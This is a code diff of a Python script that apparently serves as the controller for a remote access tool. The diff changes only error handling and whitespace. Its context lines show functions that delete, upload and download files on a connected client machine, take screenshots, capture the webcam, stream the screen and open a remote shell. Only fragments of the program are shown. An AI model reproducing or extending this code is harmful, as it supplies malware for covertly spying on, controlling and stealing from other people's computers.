@@ -9,6 +9,7 @@ import pyautogui
 import pickle
 import struct
 import numpy as np
+
 #banner
 print("*******************************************************")
 print("""
@@ -38,6 +39,7 @@ def dmenu(nm):
     print("----------------------------------------------------------------------------")
     print("1. Delete file \n2. Delet Dir/Folder \n3. Change "+nm+" Dir \n4. File list \n5. Exit \n")
     print("----------------------------------------------------------------------------")
+    
 #deloading
 def dload():
     a=100;
@@ -72,8 +74,8 @@ def cdel(conn):
             print("\nWrong Choice!")
             cdel(conn)
         return True
-    except:
-        print("Error")    
+    except Exception as e:
+        print(e)    
 #delete files or folders in your DIR
 def fdel():
     try:
@@ -107,8 +109,8 @@ def fdel():
             print("\nWrong Choice!")
             fdel()
         return True
-    except:
-        print("Error")
+    except Exception as e:
+        print(e)
         
         
 
@@ -123,8 +125,8 @@ def chdir():
            print(os.getcwd())
         else :
             return
-    except:
-        print("Error")
+    except Exception as e:
+        print(e)
     
 #client DIR to change
     
@@ -140,8 +142,8 @@ def cchdir(conn):
            print("client current working dir :"+conn.recv(1024).decode("utf-8"))
         else :
             return
-    except:
-        print("Error")
+    except Exception as e:
+        print(e)
 
 #Your Working DIR Files
     
@@ -159,8 +161,8 @@ def cflist(conn):
         arr=pickle.loads(conn.recv(1024))
         for i in arr:
             print(i)
-    except:
-        print("Error")
+    except Exception as e:
+        print(e)
         
 #upload file to client
         
@@ -186,8 +188,8 @@ def fup(conn):
                     print("\nUpload Completed!")
         else:
             print("File Does Not Exist!")
-    except:
-        print("Error")
+    except Exception as e:
+        print(e)
 
 #download file from client
                 
@@ -218,8 +220,9 @@ def fdown(conn):
                     f.close()
             else:
                 print("File Does Not Exist!")
-    except:
-        print("Error")
+    except Exception as e:
+        print(e)
+
 #screenshot
 def sshot(conn):
     try:
@@ -239,8 +242,8 @@ def sshot(conn):
         else:
             print("Fail to take screenshot!")
         return
-    except:
-        print("Error")
+    except Exception as e:
+        print(e)
 
 #camera
 def cam(conn):
@@ -273,6 +276,7 @@ def cam(conn):
             print(C)
     else:
         print(K)
+
 #screenstreaming
 def stream(conn):
     try:
@@ -305,8 +309,8 @@ def stream(conn):
                     cv2.waitKey(1)
         else:
             print(K)
-    except:
-        print("Error")
+    except Exception as e:
+        print(e)
                 
 #commands that perform on client
 def mano(cip,conn):
@@ -399,6 +403,7 @@ def sendcommands(conn):
                 break
     except:
         print("Error while connecting Shell")
+
 while True:
     host,s=sock()
     mano(host,s)
